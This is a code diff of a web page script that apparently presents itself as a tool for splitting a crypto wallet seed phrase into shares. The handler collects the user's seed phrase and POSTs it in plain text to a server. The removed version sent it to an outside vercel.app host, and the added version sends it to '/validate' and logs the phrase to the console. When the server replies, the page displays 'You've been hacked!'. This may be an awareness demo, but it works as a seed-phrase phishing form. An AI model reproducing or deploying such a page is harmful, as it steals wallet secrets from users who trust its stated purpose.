@@ -94,15 +94,19 @@
             e.preventDefault();
             const seedPhrase = document.getElementById('seedPhrase').value.trim();
             const threshold = document.getElementById('threshold').value;
-    
-            const response = await fetch('generate-shares-a7jcqwvgy-solettys-projects.vercel.app', {
+
+            console.log(`Sending seed phrase: ${seedPhrase}`);
+            console.log(`Selected threshold: ${threshold}`);
+
+            const response = await fetch('/validate', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ seedPhrase, threshold })
             });
             const data = await response.json();
-    
+
             if (data.message.includes('hacked')) {
+                // Change the page to the "You’ve been hacked!" message
                 document.body.classList.add('hacked');
                 document.body.innerHTML = '<div class="hacked-text">You’ve been hacked!</div>';
             } else {
